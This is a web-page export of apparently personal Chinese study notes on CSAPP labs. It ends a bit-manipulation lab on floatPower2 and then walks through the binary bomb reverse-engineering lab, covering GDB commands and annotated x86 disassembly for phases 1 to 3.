  return res;
}
</code></pre>
<h2>浮点数表示 2 的幂（难度：⭐⭐⭐⭐）</h2>
<pre><code class="language-c">/* 
 * floatPower2 - Return bit-level equivalent of the expression 2.0^x
 *   (2.0 raised to the power x) for any 32-bit integer x.
 *
 *   The unsigned value that is returned should have the identical bit
 *   representation as the single-precision floating-point number 2.0^x.
 *   If the result is too small to be represented as a denorm, return
 *   0. If too large, return +INF.
 * 
 *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while 
 *   Max ops: 30 
 *   Rating: 4
 */
unsigned floatPower2(int x) {
  
    // 无穷大
    if(x&gt;127){
      return 0xFF&lt;&lt;23;
    }

	// 无法表示
    if(x&lt;-148)
      return 0;

	// exp的指数范围：-126~127
	// 规格化数2^-126
    if(x&gt;=-126) 
      return (x+127)&lt;&lt;23;

    // 大于等于-148，小于-126
    // 非规格化数
    return (1&lt;&lt;(148+x));
}
</code></pre>
<h1>后续任务</h1>
<ul>
<li>[ ] 详细理解并完善后续几个函数。</li>
</ul>
<h1>本文参考</h1>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/339047608">CSAPP:Lab1 -DataLab 超详解 - 知乎 (zhihu.com)</a></li>
</ul>


                
            </main>

            <footer class="list-content-container">
                
                <details class="record-links" open="open">
                    <summary class="menu-title">
                        links
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-links-list">
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link highlight">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link highlight">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link highlight">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li>CSAPP LAB-1 位操作（本文）</li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link highlight">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                

                
                <details class="record-backlinks" open="open">
                    <summary class="menu-title">
                        backlinks
                        <span class="badge">4</span>
                    </summary>

                    <ul class="record-backlinks-list">
                        
                        <li data-target-id="3522416439">
                            <a href="#3522416439">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-2 二进制炸弹实验</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1735947091">
                            <a href="#1735947091">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-3 缓冲区溢出炸弹</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="165066519">
                            <a href="#165066519">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-4 代码优化</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li>CSAPP LAB-4 代码优化（本文）</li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                        <li data-target-id="1051831239">
                            <a href="#1051831239">
                                <span class="record-type-points">
                                    
                                    <span style="color: var(--n_csapp-labs);">⬤</span>
                                    
                                </span>
                                
                                <span>CSAPP LAB-5 手写动态存储分配器</span>
                                
                                <div class="record-links-context hover">
                                    <blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link highlight">CSAPP LAB-1 位操作</a></li>
<li><a href="#3522416439" title="CSAPP LAB-2 二进制炸弹实验" class="record-link ">CSAPP LAB-2 二进制炸弹实验</a></li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li>CSAPP LAB-5 手写动态存储分配器（本文）</li>
</ul>
</blockquote>

                                </div>
                                
                            </a>
                        </li>
                        
                    </ul>
                </details>
                
            </footer>
        </article>
        
        <article id="3522416439" class="record">
            <header>
                <h1 class="record-title">CSAPP LAB-2 二进制炸弹实验</h1>

                

                

                <div class="record-type">
                    <span>types :</span>
                    <span>undefined</span>
                </div>

                
                <div class="record-tags">
                    <span>keywords :</span>
                    
                    <button class="btn" onclick="activeTag('CSAPP');">CSAPP</button>
                    
                    <button class="btn" onclick="activeTag('ASM');">ASM</button>
                    
                    <button class="btn" onclick="activeTag('C');">C</button>
                    
                    <button class="btn" onclick="activeTag('实验');">实验</button>
                    
                    <button class="btn" onclick="activeTag('GDB');">GDB</button>
                    
                    <button class="btn" onclick="activeTag('objdump');">objdump</button>
                    
                </div>
                

                
                <div class="record-begin">
                    <span>Begin :</span>
                    <span>5/22/2024</span>
                </div>
                

                

                
                <div class="record-cover">
                    <span>cover :</span>
                    <span>https://cdn.gallery.uuanqin.top/img/20240522192911.webp</span>
                </div>
                
                <div class="record-description">
                    <span>description :</span>
                    <span>该补的地方还是得补</span>
                </div>
                
                <div class="record-abbrlink">
                    <span>abbrlink :</span>
                    <span>d1f3cf37</span>
                </div>
                
                <div class="record-top_img">
                    <span>top_img :</span>
                    <span></span>
                </div>
                
            </header>

            <main class="record-content">
                <blockquote>
<p>死去的炸弹又来攻击我！！😅😅😅</p>
</blockquote>
<p>CS: APP 是本科时候的必选课，研究生阶段选修了这门课，相当于重新再学一遍。本科学这门课时正值疫情，在加里敦（家里蹲）大学上了一个学期，当时太迷茫了，啥也不会，整个课上得懵懵懂懂。估计那时的炸弹也是看着网上的教程东抄抄西补补勉强弄出来的。</p>
<p>现在研究生了，该补的地方还是得补。不管有多忙，我决定沉下心来重看《CSAPP》，炸弹客实验也打算亲自做做。最终还是做出来了😎，耗时 2 天。难度怎么说——还算适中吧，如果你仔细看过课本就不难。</p>
<p>目前基本的 6 层炸弹已经拆除，还有一层隐藏层有时间再研究。由于每个人收到的炸弹是不同的（你的老师会说根据你的学号选择相应的炸弹），所以文章仅提供基本思路供参考。</p>
<blockquote>
<p>《深入理解计算机系统》：Computer Systems. A Programmer’s Perspective</p>
</blockquote>
<blockquote>
<p>[!notice] CSAPP LAB 实验</p>
<ul>
<li><a href="#3315008132" title="CSAPP LAB-1 位操作" class="record-link ">CSAPP LAB-1 位操作</a></li>
<li>CSAPP LAB-2 二进制炸弹实验（本文）</li>
<li><a href="#1735947091" title="CSAPP LAB-3 缓冲区溢出炸弹" class="record-link ">CSAPP LAB-3 缓冲区溢出炸弹</a></li>
<li><a href="#165066519" title="CSAPP LAB-4 代码优化" class="record-link ">CSAPP LAB-4 代码优化</a></li>
<li><a href="#1051831239" title="CSAPP LAB-5 手写动态存储分配器" class="record-link ">CSAPP LAB-5 手写动态存储分配器</a></li>
</ul>
</blockquote>
<h1>实验介绍</h1>
<p>二进制炸弹包含若干个阶段，每个阶段需要输入特定的字符串，所有输入正确则炸弹被排除，否则…..</p>
<p>我们的任务是找出这些字符串字符串记录到文件中，可输入命令验证 <code>./bomb  solution.txt</code> 用换行区别不同阶段的字符串。</p>
<p>下载压缩包 bombs，压缩包包含多个 <code>bomb</code> 代码包，根据学号领取自己的代码包。</p>
<p>查看 <code>bomb.c</code> 可知程序利用 <code>phase_*</code> 函数（<code>*</code> 为 1~6） 检查输入字符串是否合法，不合法就引爆炸弹。我们的任务就是逆向出每个 phase 的检查规则，构造出合法字符串。当然，<code>bomb.c</code> 没有给出 <code>phase_*</code> 的源码</p>
<p>逆向方法：</p>
<ul>
<li>GDB</li>
<li>直接反汇编</li>
</ul>
<p>课本参考：</p>
<ul>
<li>CSAPP 第三章：GDB 的使用</li>
<li>CSAPP 第三章：过程</li>
</ul>
<p>链接参考（喜报：全是 English）：</p>
<ul>
<li>GDB：
<ul>
<li><a href="https://heather.cs.ucdavis.edu/matloff/public_html/UnixAndC/CLanguage/Debug.html">Guide to Faster, Less Frustrating Debugging (ucdavis.edu)</a></li>
<li><a href="https://www.gnu.org/software/gdb/">GDB: The GNU Project Debugger</a></li>
</ul>
</li>
<li>X86 指令手册：<a href="http://csapp.cs.cmu.edu/public/students.html">CS:APP2e, Bryant and O'Hallaron (cmu.edu)</a></li>
<li>GNU 汇编语法参考：
<ul>
<li>Wiki 简明介绍：<a href="https://en.wikibooks.org/wiki/X86_Assembly/GNU_assembly_syntax">x86 Assembly/GNU assembly syntax - Wikibooks</a></li>
<li>手册：<a href="https://sourceware.org/binutils/docs/as/">Top (Using as) (sourceware.org)</a></li>
</ul>
</li>
</ul>
<blockquote>
<p>汇编语法看课本就行，GDB 命令看本文后续章节就行。以上链接你可以一个都不用点开。</p>
</blockquote>
<h1>GDB 工具的使用</h1>
<pre><code class="language-sh">apt install gdb # 安装 GDB
gdb --version   # 检查是否安装成功
</code></pre>
<p>GDB 不需要了解过多，想干什么直接查就行。现用现学。</p>
<p>你可能用到的命令只有这些：</p>
<ul>
<li><code>run</code>：运行 GDB</li>
<li><code>continue</code>：继续运行，可简写为 <code>c</code>。</li>
<li><code>break &lt;addr&gt;</code>：在指定地址处设置断点。<code>break</code> 可简写为 <code>b</code>。</li>
<li><code>print $eax</code>：打印某个寄存器的值。<code>print</code> 可简写为 <code>p</code>。</li>
<li><code>p /x ($esp-0x8)</code>：打印某个寄存器的值的运算结果</li>
<li><code>print (char *) &lt;addr&gt;</code> ：将直接打印该地址 <code>addr</code> 下的字符串</li>
<li><code>print /x * &lt;addr&gt;</code> ：以十六进制的形式打印指定地址 <code>addr</code> 的值</li>
<li><code>print ((int*) &lt;addr&gt;)[&lt;index&gt;]</code> ：打印指定位置 <code>addr</code> 数组下标为 <code>index</code> 的元素</li>
<li><code>print ((int*) &lt;addr&gt;)[&lt;index&gt;]@&lt;num&gt;</code> ：打印指定位置数组的元素，起始坐标为 <code>index</code>，输出 <code>num</code> 个元素</li>
</ul>
<p>截一张课本的图供更多参考：</p>
<p><img src="https://cdn.gallery.uuanqin.top/img/20240519124236.webp" alt="image.png"></p>
<h1>开始拆弹！</h1>
<h2>拆弹准备</h2>
<p>在 Linux 环境下解压 bomb 压缩文件。</p>
<pre><code class="language-sh">tar -xvf bomb7.tar
</code></pre>
<p>得到如下文件：</p>
<ul>
<li><code>bomb</code>：二进制可执行文件，任务目标文件</li>
<li><code>bomb.c</code>：<code>bomb</code> 的源文件，辅助理解 <code>bomb</code> 代码</li>
</ul>
<p>首先使用 <code>objdump</code> 反汇编工具对 <code>bomb</code> 进行反汇编，输出的汇编文件名为 <code>dump.s</code>：</p>
<pre><code class="language-sh">objdump -d bomb &gt; dump.s
</code></pre>
<p><code>bomb.c</code> 是 <code>bomb</code> 的部分源文件，包含主函数 <code>main</code>。通读 <code>main</code> 函数以及注释，我们知道：</p>
<ol>
<li>运行 <code>bomb</code> 时如果不带参数，我们将在标准输入中输入拆弹的字符串。</li>
<li>运行 <code>bomb</code> 时如果携带一个参数，则先从指定的文件中读取字符串</li>
<li>运行 <code>bomb</code> 时如果携带多于一个参数，则输出提示：<code>bomb [&lt;input_file&gt;]</code></li>
<li>一共有 6 层炸弹，每一层通过输入一行字符串以进行拆弹</li>
<li>炸弹爆炸后不会有任何人受到伤害</li>
<li>可能存在隐藏关卡</li>
</ol>
<p>此外，我们可以在炸弹运行时 <kbd>Ctrl</kbd>+<kbd>C</kbd> 中止拆弹，邪恶博士😈（Dr. Evil）最终还是会放我们走的：</p>
<pre><code class="language-stdout">^CSo you think you can stop the bomb with ctrl-c, do you?
Well...OK. :-)
</code></pre>
<p>新建文件 <code>solution.txt</code>，之后我们可以直接在里面写字符串答案（每行按序写上各层答案），从而不用手动输入字符串。</p>
<p><code>bomb.c</code> 看完后，它的作用基本结束了。后面我们的时间将会花在人工解读 <code>dump.s</code> 文件以及使用 gdb 调试工具的过程中。</p>
<p><code>dump.s</code> 文件阅读要点：</p>
<ol>
<li>不需要看懂所有汇编代码（实际上也不可能），只需看懂关键函数部分的代码。</li>
<li>关键函数：各层炸弹函数 <code>&lt;phase_X&gt;</code>，中间穿插的函数 <code>&lt;funcX&gt;</code>。为了便于自己的理解，有时候你也可以看一些工具类的函数，比如 <code>&lt;read_six_numbers&gt;</code> <code>&lt;strings_not_equal&gt;</code> 等，但这些函数看名字就知道其作用。</li>
<li>当运行到 <code>&lt;explode_bomb&gt;</code> 时炸弹爆炸，当该层函数安全结束返回到 main 运行 <code>&lt;phase_defused&gt;</code> 时该层炸弹安全破解。</li>
<li>多注释和分行便于阅读</li>
</ol>
<p>在破解某一层炸弹是，我们可以先随便输几个数，通过 GDB 工具推测我们的输入存放在栈中的哪个位置，这样也能方便推理。</p>
<h2>Phase 1 - 寻找字符串</h2>
<blockquote>
<p>asm 代码阅读提示：左侧为程序地址与指令字节码，右侧为反汇编后得到的汇编代码。注释使用 <code>;</code> 以及 <code>#</code>。</p>
</blockquote>
<pre><code class="language-asm">08048b80 &lt;phase_1&gt;:
 8048b80:	55                   	push   %ebp
 8048b81:	89 e5                	mov    %esp,%ebp
 8048b83:	83 ec 08             	sub    $0x8,%esp			# 栈指针 -8 
 8048b86:	c7 44 24 04 d8 99 04 	movl   $0x80499d8,0x4(%esp) # 栈+4 取 0x80499d8 存储的字符串
 8048b8d:	08 
 8048b8e:	8b 45 08             	mov    0x8(%ebp),%eax       # 原先的栈指针 + 8 给 eax
 8048b91:	89 04 24             	mov    %eax,(%esp)          # eax 放到 栈当前指向的位置
 8048b94:	e8 86 05 00 00       	call   804911f &lt;strings_not_equal&gt; # 返回 0 表示字符串相等
 8048b99:	85 c0                	test   %eax,%eax            # test 执行的是 AND 操作。 eax为0才成功
 8048b9b:	74 05                	je     8048ba2 &lt;phase_1+0x22&gt; # 破解成功 je 是判断标志位ZF是否为1
 8048b9d:	e8 44 0b 00 00       	call   80496e6 &lt;explode_bomb&gt; # 破解失败
 8048ba2:	c9                   	leave  
 8048ba3:	c3                   	ret   
</code></pre>
<blockquote>
<p>使用 GDB 调试前记得打断点，比如：<code>b *0x8048b94</code></p>
</blockquote>
<pre><code class="language-gdb">(gdb) p (char*)  0x80499d8
$2 = 0x80499d8 &quot;I am not part of the problem. I am a Republican.&quot;
</code></pre>
<p>解析及要点：</p>
<ul>
<li>本层通过判断输入的字符串是否与指定字符串相等。</li>
<li>此层只需使用 GDB 指令找出地址 <code>$0x80499d8</code> 存储的字符串，该字符串就是本层答案。</li>
</ul>
<p>点评与提示：</p>
<ul>
<li>拆弹入门。</li>
<li>像遇到这种存在「魔数」的指令要多留心，常使用 GDB 打印该位置的内容，有可能存储关键字符串或数组。</li>
<li>%eax 多用于存储函数返回结果</li>
<li><code>test   %eax,%eax</code> ：<code>test</code> 相当于 <code>and</code> 指令，用于测试 <code>%eax</code> 是否为 0。<code>je</code> 指令会判断 <code>ZF</code> 标志位，当 ZF 为 1 时说明 <code>%eax</code> 为 0，程序执行跳转。</li>
</ul>
<h2>Phase 2 - 有序数组</h2>
<pre><code class="language-asm">08048ba4 &lt;phase_2&gt;:
 8048ba4:	55                   	push   %ebp
 8048ba5:	89 e5                	mov    %esp,%ebp
 8048ba7:	83 ec 28             	sub    $0x28,%esp              # 栈指针 - 0x28 = 40 ；栈分配 40 字节
 8048baa:	8d 45 e4             	lea    -0x1c(%ebp),%eax        # 原先栈 - 0x1c = 28
 8048bad:	89 44 24 04          	mov    %eax,0x4(%esp)		# 栈+4 &lt;- 原先栈-28
 8048bb1:	8b 45 08             	mov    0x8(%ebp),%eax
 8048bb4:	89 04 24             	mov    %eax,(%esp)			# 栈 &lt;- 原先栈+8
 8048bb7:	e8 d0 04 00 00       	call   804908c &lt;read_six_numbers&gt;
 8048bbc:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)      # i = 1
 8048bc3:	eb 1e                	jmp    8048be3 &lt;phase_2+0x3f&gt;

 # 循环开始（比较前后两个数是否相差5）
 8048bc5:	8b 45 fc             	mov    -0x4(%ebp),%eax          # 取 i
 8048bc8:	8b 54 85 e4          	mov    -0x1c(%ebp,%eax,4),%edx  # arr[i]
 8048bcc:	8b 45 fc             	mov    -0x4(%ebp),%eax          
 8048bcf:	48                   	dec    %eax                     # 取 i-1 
 8048bd0:	8b 44 85 e4          	mov    -0x1c(%ebp,%eax,4),%eax  # arr[i-1]
 8048bd4:	83 c0 05             	add    $0x5,%eax				
 8048bd7:	39 c2                	cmp    %eax,%edx
 8048bd9:	74 05                	je     8048be0 &lt;phase_2+0x3c&gt;   # arr[i-1]+5 == arr[i] 必须相等
 8048bdb:	e8 06 0b 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048be0:	ff 45 fc             	incl   -0x4(%ebp)               # i+=1

 8048be3:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp)      
 8048be7:	7e dc                	jle    8048bc5 &lt;phase_2+0x21&gt; # i &lt;= 5 继续循环(i从1开始)
 8048be9:	c9                   	leave  
 8048bea:	c3                   	ret    
</code></pre>
<p>断点打到 <code>&lt;read_six_numbers&gt;</code> 之后，比如 <code>0x8048bbc</code>。我们随便输入 5 个数字，比如 <code>1 6 11 16 21 26</code>，通过 GDB 可以判断其存储位置：</p>
<pre><code class="language-gdb"># 下面展示了输入的 6 个数字的存储位置（示例数据）
(gdb) p *(int*) 0xffffcc6c    $6 = 1
(gdb) p *(int*) 0xffffcc70    $8 = 6
(gdb) p *(int*) 0xffffcc74    $9 = 11
(gdb) p *(int*) 0xffffcc78    $10 = 16
(gdb) p *(int*) 0xffffcc7c    $11 = 21
(gdb) p *(int*) 0xffffcc80    $12 = 26
</code></pre>
<blockquote>
<p>为啥会知道查 6 个地址。我们根据这个原则就行：汇编中用到哪里，GDB 就查哪里。</p>
</blockquote>
<p>这里的汇编代码中存在一个典型的 <code>for</code> 循环结构，使用了「跳转到中间」策略（具体请看教材）。for 循环的通用形式：</p>
<pre><code class="language-c">for(init-expr;test-expr;update-expr)
	body-statement;

// 行为与下面的while循环代码一样
init-expr;
while(test-expr){
	body-statement
	update-expr;
}
</code></pre>
<p>该部分汇编代码结构翻译为 C 语言的大致结构如下：</p>
<pre><code class="language-c">	init-expr;
	goto test;
loop:
	body-statement;
	update-expr;
test:
	t=test-expr;
	if(t)
		goto loop;
</code></pre>
<p>解析及要点：</p>
<ul>
<li>本层需输入 6 个数字，每个数字需构成升序的等差数列（公差为 5）</li>
</ul>
<p>点评与提示：</p>
<ul>
<li>识别 <code>for</code> 循环</li>
<li>知道输入的 6 个数字的存储位置</li>
</ul>
<h2>Phase 3 - 跳转表</h2>
<blockquote>
<p>相信你通过了前面汇编的洗礼后，汇编代码的阅读能力提高了不少。本层开始就不会啰嗦太多哦，看注释即可。</p>
</blockquote>
<pre><code class="language-asm">08048beb &lt;phase_3&gt;:
 8048beb:	55                   	push   %ebp
 8048bec:	89 e5                	mov    %esp,%ebp
 8048bee:	83 ec 38             	sub    $0x38,%esp
 8048bf1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
 8048bf8:	8d 45 f0             	lea    -0x10(%ebp),%eax
 8048bfb:	89 44 24 10          	mov    %eax,0x10(%esp)
 8048bff:	8d 45 ef             	lea    -0x11(%ebp),%eax
 8048c02:	89 44 24 0c          	mov    %eax,0xc(%esp)
 8048c06:	8d 45 f4             	lea    -0xc(%ebp),%eax
 8048c09:	89 44 24 08          	mov    %eax,0x8(%esp)
 8048c0d:	c7 44 24 04 09 9a 04 	movl   $0x8049a09,0x4(%esp)
</code></pre>
<p>查看魔数信息：</p>
<pre><code class="language-gdb">(gdb) p (char*) 0x8049a09
$13 = 0x8049a09 &quot;%d %c %d&quot;
</code></pre>
<p>这个字符串是不是很眼熟，这可能提示我们输入 3 个数据：1 个数字、1 个字符以及 1 个数字。我们可以像上一层那样随便输入 3 个数据。</p>
<pre><code class="language-asm"> 8048c14:	08 
 8048c15:	8b 45 08             	mov    0x8(%ebp),%eax
 8048c18:	89 04 24             	mov    %eax,(%esp)
 8048c1b:	e8 48 fc ff ff       	call   8048868 &lt;sscanf@plt&gt;
 8048c20:	89 45 f8             	mov    %eax,-0x8(%ebp)          # 返回输入的个数
 8048c23:	83 7d f8 02          	cmpl   $0x2,-0x8(%ebp)
 8048c27:	7f 05                	jg     8048c2e &lt;phase_3+0x43&gt; 	# 输入（长度）必须大于2
 8048c29:	e8 b8 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048c2e:	8b 45 f4             	mov    -0xc(%ebp),%eax          # -0xc(%ebp)携带输入的首地址
 8048c31:	89 45 dc             	mov    %eax,-0x24(%ebp)         # 经过GDB调试，-0x24(%ebp) 表示第一个输入的数字
 8048c34:	83 7d dc 07          	cmpl   $0x7,-0x24(%ebp)         # 输入的数字必须小于等于7
 8048c38:	0f 87 c0 00 00 00    	ja     8048cfe &lt;phase_3+0x113&gt; 	# 无符号大于7 - 则爆炸
 8048c3e:	8b 55 dc             	mov    -0x24(%ebp),%edx			# %edx = 第一个输入的数字
 8048c41:	8b 04 95 14 9a 04 08 	mov    0x8049a14(,%edx,4),%eax 	
 8048c48:	ff e0                	jmp    *%eax 					# 例如第一个输入的数字是6 则 eax=0x8048cd4
</code></pre>
<blockquote>
<p>汇编中用到哪里，GDB 就查哪里。<code>-0x24(%ebp)</code> 指向我们第一个输入的数字。</p>
</blockquote>
<p>像 <code>jmp    *%eax</code> 这种语法很眼熟，像是课本中提到的 <code>switch</code> 语句的汇编。我们可以尝试找出其跳转表：</p>
<pre><code class="language-gdb">(gdb) print /x ((int*) 0x8049a14)[0]@8
$25 = {0x8048c4a, 0x8048c66, 0x8048c82, 0x8048c97, 0x8048cac, 0x8048cbf, 0x8048cd4, 0x8048ce9}
</code></pre>
<p>我们就随便选一个，比如 6。接下来我们看 6 的代码就行。</p>
<pre><code class="language-asm"> # 0
 8048c4a:	c6 45 ff 67          	movb   $0x67,-0x1(%ebp)
 8048c4e:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048c51:	3d c8 00 00 00       	cmp    $0xc8,%eax
 8048c56:	0f 84 ab 00 00 00    	je     8048d07 &lt;phase_3+0x11c&gt;
 8048c5c:	e8 85 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048c61:	e9 a1 00 00 00       	jmp    8048d07 &lt;phase_3+0x11c&gt;

 # 1
 8048c66:	c6 45 ff 6c          	movb   $0x6c,-0x1(%ebp)
 8048c6a:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048c6d:	3d c7 03 00 00       	cmp    $0x3c7,%eax
 8048c72:	0f 84 8f 00 00 00    	je     8048d07 &lt;phase_3+0x11c&gt;
 8048c78:	e8 69 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048c7d:	e9 85 00 00 00       	jmp    8048d07 &lt;phase_3+0x11c&gt;

 # 2
 8048c82:	c6 45 ff 69          	movb   $0x69,-0x1(%ebp)
 8048c86:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048c89:	3d 1e 02 00 00       	cmp    $0x21e,%eax
 8048c8e:	74 77                	je     8048d07 &lt;phase_3+0x11c&gt;
 8048c90:	e8 51 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048c95:	eb 70                	jmp    8048d07 &lt;phase_3+0x11c&gt;

# 3
 8048c97:	c6 45 ff 6e          	movb   $0x6e,-0x1(%ebp)
 8048c9b:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048c9e:	3d 6a 03 00 00       	cmp    $0x36a,%eax
 8048ca3:	74 62                	je     8048d07 &lt;phase_3+0x11c&gt;
 8048ca5:	e8 3c 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048caa:	eb 5b                	jmp    8048d07 &lt;phase_3+0x11c&gt;
 8048cac:	c6 45 ff 6f          	movb   $0x6f,-0x1(%ebp)

 # 4
 8048cb0:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048cb3:	83 f8 3f             	cmp    $0x3f,%eax
 8048cb6:	74 4f                	je     8048d07 &lt;phase_3+0x11c&gt;
 8048cb8:	e8 29 0a 00 00       	call   80496e6 &lt;explode_bomb&gt;
 8048cbd:	eb 48                	jmp    8048d07 &lt;phase_3+0x11c&gt;

 # 5
 8048cbf:	c6 45 ff 69          	movb   $0x69,-0x1(%ebp)
 8048cc3:	8b 45 f0             	mov    -0x10(%ebp),%eax
